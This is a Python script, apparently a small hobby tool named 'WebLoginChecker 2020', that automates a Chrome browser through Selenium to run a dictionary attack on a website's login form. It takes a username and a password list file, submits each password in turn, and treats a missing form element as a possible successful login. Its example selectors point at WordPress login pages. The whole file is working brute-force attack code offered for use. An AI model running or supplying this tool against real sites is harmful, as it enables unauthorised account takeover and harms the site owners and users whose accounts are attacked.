# WebLoginChecker 2020 by @lxndroc-@aoctut - edit on Hatch by @metachar
from requests import get
from selenium.common.exceptions import NoSuchElementException
from selenium import webdriver
from time import sleep

def check_website(website):
    STATUS_OK = 200
    print('[!] Checking if site exists')
    try:
        request = get(website)
        if request.status_code == STATUS_OK:
            print('[v] OK')
            return True
    except:
        print('[x] Website not accessible!')
    return False

def check_pass(website, username_selector, password_selector, login_button_selector, username, pass_list):
    DRIVER_PATH = 'chromedriver'

    if not website:
        website = input('\n[~] Website to check: ')
    if not username_selector:
        username_selector = input('[~] Username selector: ')
    if not password_selector:
        password_selector = input('[~] Password selector: ')
    if not login_button_selector:
        login_button_selector = input('[~] Login button selector: ')
    if not username:
        username = input('[~] Username: ')
    if not pass_list:
        pass_list = input('[~] Path & file of password list: ')
    if not check_website(website):
        return

    pass_file = open(pass_list)
    try_count = 1
    browser = webdriver.Chrome(DRIVER_PATH)
    browser.get(website)
    try:
        user_entry = browser.find_element_by_css_selector(username_selector)
        pass_entry = browser.find_element_by_css_selector(password_selector)
        login_button = browser.find_element_by_css_selector(login_button_selector)
        for password in pass_file:
            sleep(1)
            user_entry.send_keys(username)
            pass_entry.send_keys(password)
            login_button.click()
            print(24 * '-')
            print(f'{try_count}. Tried password: {password} for user: {username}')
            try_count += 1
    except KeyboardInterrupt:
        return
    except NoSuchElementException:
        print('[!] Missing element from the web page')
        if try_count > 1:
            print('[x] Attempts were limited or [v] Password was found!')
            print(f'Last tried or found password: {password}')
        else:
            print('[x] Selector not found or Attempts were limited!')            
        return
    except:
        pass

def main():
    BANNER = 'WebLoginChecker 2020 - by @lxndroc-@aoctut'
    # update this with the url to be checked, e.g. https://website.com
    WEBSITE = ''
    # update this with the username field selector, e.g. #user_login
    USERNAME_SELECTOR = ''
    # update this with the password field selector, e.g. #user_pass
    PASSWORD_SELECTOR = ''
    # update this with the login button selector, e.g. #wp-submit
    LOGIN_BUTTON_SELECTOR = ''
    # update this with the username to be checked, e.g. test
    USERNAME = ''
    # update this with the path and filename containing the passwords to be checked, e.g. passlist.txt
    PASS_LIST = ''

    print(BANNER)
    check_pass(WEBSITE, USERNAME_SELECTOR, PASSWORD_SELECTOR, LOGIN_BUTTON_SELECTOR, USERNAME, PASS_LIST)

main()
